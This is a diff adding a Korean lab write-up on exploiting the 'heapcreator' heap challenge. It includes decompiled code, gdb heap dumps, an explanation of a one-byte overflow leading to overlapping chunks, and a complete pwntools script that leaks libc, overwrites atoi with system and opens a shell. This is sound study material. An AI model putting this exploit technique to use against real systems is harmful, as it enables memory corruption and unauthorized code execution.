@@ -825,3 +825,244 @@ local flag!
 
 <br>
 
+# LAB 13
+
+```c
+unsigned __int64 create_heap()
+{
+  _QWORD *v0; // rbx
+  signed int i; // [rsp+4h] [rbp-2Ch]
+  size_t size; // [rsp+8h] [rbp-28h]
+  char buf; // [rsp+10h] [rbp-20h]
+  unsigned __int64 v5; // [rsp+18h] [rbp-18h]
+
+  v5 = __readfsqword(0x28u);
+  for ( i = 0; i <= 9; ++i )
+  {
+    if ( !heaparray[i] )
+    {
+      heaparray[i] = malloc(0x10uLL);
+      if ( !heaparray[i] )
+      {
+        puts("Allocate Error");
+        exit(1);
+      }
+      printf("Size of Heap : ");
+      read(0, &buf, 8uLL);
+      size = atoi(&buf);
+      v0 = heaparray[i];
+      v0[1] = malloc(size);
+      if ( !*((_QWORD *)heaparray[i] + 1) )
+      {
+        puts("Allocate Error");
+        exit(2);
+      }
+      *(_QWORD *)heaparray[i] = size;
+      printf("Content of heap:", &buf);
+      read_input(*((void **)heaparray[i] + 1), size);
+      puts("SuccessFul");
+      return __readfsqword(0x28u) ^ v5;
+    }
+  }
+  return __readfsqword(0x28u) ^ v5;
+}
+```
+
+create heap() size는 임의로 지정가능하고 size만큼만 content에 적을 수 있다.
+
+```c
+unsigned __int64 edit_heap()
+{
+  int v1; // [rsp+Ch] [rbp-14h]
+  char buf; // [rsp+10h] [rbp-10h]
+  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  printf("Index :");
+  read(0, &buf, 4uLL);
+  v1 = atoi(&buf);
+  if ( v1 < 0 || v1 > 9 )
+  {
+    puts("Out of bound!");
+    _exit(0);
+  }
+  if ( heaparray[v1] )
+  {
+    printf("Content of heap : ", &buf);
+    read_input(*((void **)heaparray[v1] + 1), *(_QWORD *)heaparray[v1] + 1LL);
+    puts("Done !");
+  }
+  else
+  {
+    puts("No such heap !");
+  }
+  return __readfsqword(0x28u) ^ v3;
+}
+```
+
+edit 메뉴가 있지만.. size만큼만 쓰게 해주는 걸로 보이는데 특이점이 있다. 바로 +1 만큼 써주게 해준다는 것 1byte overflow가 나서 Off-by-one보다 더 유용하게 사용할 수 있다. (사실 소스를 대충봐서 발견 못했는데 아니 이거 off-by-one 없으면 어케 풀어 하고 넣으니까 바로 되길래 알아냄.. 소스를 잘 봐야 되는데 손포징만 늘어가고 있다 ㅠㅠ)
+
+그리고 show(), delete() 함수까지 딱 전형적인 heap 바이너리 이다.
+
+```c
+gdb-peda$ par
+addr                prev                size                 status              fd                bk
+0x1a85000           0x0                 0x20                 Used                None              None
+0x1a85020           0x0                 0x20                 Used                None              None
+gdb-peda$ x/12gx 0x1a85000
+0x1a85000:	0x0000000000000000	0x0000000000000021
+0x1a85010:	0x0000000000000018	0x0000000001a85030
+0x1a85020:	0x0000000000000000	0x0000000000000021
+0x1a85030:	0x0000000000000041	0x0000000000000000
+0x1a85040:	0x0000000000000000	0x0000000000020fc1
+```
+
+malloc을 1개 할당 했을 때 특이점은 chunk의 정보를 담고있는 녀석과 content 한 번의 malloc을 하면 2개의 chunk가 생긴다. 내부에 magic이 사라졌기 때문에 leak을 해주어야 하는데 
+
+```c
+0x6020a0 <heaparray>:	0x0000000001a85010
+```
+
+전역변수에서 show, edit를 관리하고 있다. 저 chunk의 정보를 담고있는 포인터에서 size, content 포인터를 이용해서 show 와 edit를 하게 된다.
+
+```c
+gdb-peda$ x/30gx 0x1a85000
+0x1a85000:	0x0000000000000000	0x0000000000000021
+0x1a85010:	0x0000000000000018	0x0000000001a85030
+0x1a85020:	0x0000000000000000	0x0000000000000021
+0x1a85030:	0x0000000000000041	0x0000000000000000
+0x1a85040:	0x0000000000000000	0x0000000000000021
+0x1a85050:	0x0000000000000010	0x0000000001a85070
+0x1a85060:	0x0000000000000000	0x0000000000000021
+0x1a85070:	0x0000000000000062	0x0000000000000000
+0x1a85080:	0x0000000000000000	0x0000000000020f81
+```
+
+0x18과 0x10 두개의 chunk를 할당했는데 0x18으로 할당한 이유는 1byte overflow를 하기 위함이다. edit 메뉴로 다음 chunk의 size를 변조한다.
+
+```c
+gdb-peda$ par
+addr                prev                size                 status              fd                bk
+0x1a85000           0x0                 0x20                 Used                None              None
+0x1a85020           0x0                 0x20                 Used                None              None
+0x1a85040           0x0                 0x40                 Used                None              None
+gdb-peda$ x/30gx 0x1a85000
+0x1a85000:	0x0000000000000000	0x0000000000000021
+0x1a85010:	0x0000000000000018	0x0000000001a85030
+0x1a85020:	0x0000000000000000	0x0000000000000021
+0x1a85030:	0x6363636363636363	0x6363636363636363
+0x1a85040:	0x0000000000000000	0x0000000000000041
+0x1a85050:	0x0000000000000010	0x0000000001a85070
+0x1a85060:	0x0000000000000000	0x0000000000000021
+0x1a85070:	0x0000000000000062	0x0000000000000000
+0x1a85080:	0x0000000000000000	0x0000000000020f81
+    
+0x6020a0 <heaparray>:	0x0000000001a85010	0x0000000001a85050
+```
+
+0x41로 1byte overflow를 시켜주면 저렇게 하나의 chunk가 되게 된다.
+
+```c
+gdb-peda$ par
+addr                prev                size                 status              fd                bk
+0x1a85000           0x0                 0x20                 Used                None              None
+0x1a85020           0x0                 0x20                 Used                None              None
+0x1a85040           0x0                 0x40                 Freed                0x0              None
+gdb-peda$ x/40gx 0x1a85000
+0x1a85000:	0x0000000000000000	0x0000000000000021
+0x1a85010:	0x0000000000000018	0x0000000001a85030
+0x1a85020:	0x0000000000000000	0x0000000000000021
+0x1a85030:	0x6363636363636363	0x6363636363636363
+0x1a85040:	0x0000000000000000	0x0000000000000041
+0x1a85050:	0x0000000000000000	0x0000000001a85070
+0x1a85060:	0x0000000000000000	0x0000000000000021
+0x1a85070:	0x0000000000000000	0x0000000000000000
+0x1a85080:	0x0000000000000000	0x0000000000020f81
+```
+
+free를 하면 0x30 size의 free chunk를 얻었기 때문에 chunk의 정보를 담고있는 녀석을 덮어 쓸 수 있게된다.
+
+```c
+gdb-peda$ x/40gx 0x1a85000
+0x1a85000:	0x0000000000000000	0x0000000000000021
+0x1a85010:	0x0000000000000018	0x0000000001a85030
+0x1a85020:	0x0000000000000000	0x0000000000000021
+0x1a85030:	0x6363636363636363	0x6363636363636363
+0x1a85040:	0x0000000000000000	0x0000000000000041
+0x1a85050:	0x0000000000000000	0x0000000000000000
+0x1a85060:	0x0000000000000000	0x0000000000000000
+0x1a85070:	0x0000000000000030	0x0000000000602060
+0x1a85080:	0x0000000000000000	0x0000000000020f81
+
+0x6020a0 <heaparray>:	0x0000000001a85010	0x0000000001a85070
+```
+
+0x30만큼 할당하고 chunk의 정보 구조를 만들어 준다. 전역 변수를 보고 포인터가 찍혀있는 곳에 구조를 만들어 주고 atoi 함수를 릭 했다. atoi는 system을 쓸 때 인자 넣기가 매우 쉬워서 자주 애용하고 있는 녀석이다. show, edit 다 저 녀석으로 진행하면 된다. 원래는 puts 에 oneshot 넣으려고 했는데 잘안되서..(왜안될까 ㅠㅠ) 요녀석으로 사용했다.
+
+```python
+from pwn import * 
+
+t = process('./heapcreator')
+
+r = lambda w: t.recvuntil(str(w))
+s = lambda z: t.send(str(z))
+
+def a(a,b):
+	r(":")
+	s("1")
+	r(":")
+	s(str(a))
+	r(":")
+	s(str(b))
+
+def ed(a,b):
+	r(":")
+	s("2")
+	r(":")
+	s(str(a))
+	r(":")
+	s(str(b))
+
+def sh(a):
+	r(":")
+	s("3")
+	r(":")
+	s(str(a))
+
+def d(a):
+	r(":")
+	s("4")
+	r(":")
+	s(str(a))
+
+a(0x18,"A")
+pause()
+a(0x10,"b")
+pause()
+ed(0,"c"*0x10 + p64(0) + '\x41')
+pause()
+d(1)
+pause()
+a(0x30,p64(0)*4 + p64(0x10) + p64(0x602060))
+sh(1)
+r("Content : ")
+atoi = u64(t.recv(6).ljust(8,'\x00'))
+#print hex(puts)
+#libc = puts - 0x6f690
+libc = atoi - 0x36e80
+log.success("libc : " + hex(libc))
+o = libc + 0x4526a
+sys = libc + 0x45390
+pause()
+ed(1,p64(sys))
+r(":")
+s("/bin/sh\x00")
+pause()
+t.interactive()
+
+$ id
+uid=1000(bskim)
+```
+
+나는 로컬에서 하는 거라 그냥 로컬 립시를 사용했는데 도커 환경으로 하면 립시는 어찌하는지 잘모르겠다. 알아서 찾아서 해야 하나보다.. 처음에 진짜 얼토당토 않은 걸로 삽질 했었는데 leak 한다고.. 역시 소스를 자세히 잘 분석해야 한다..ㅠㅠ 
+
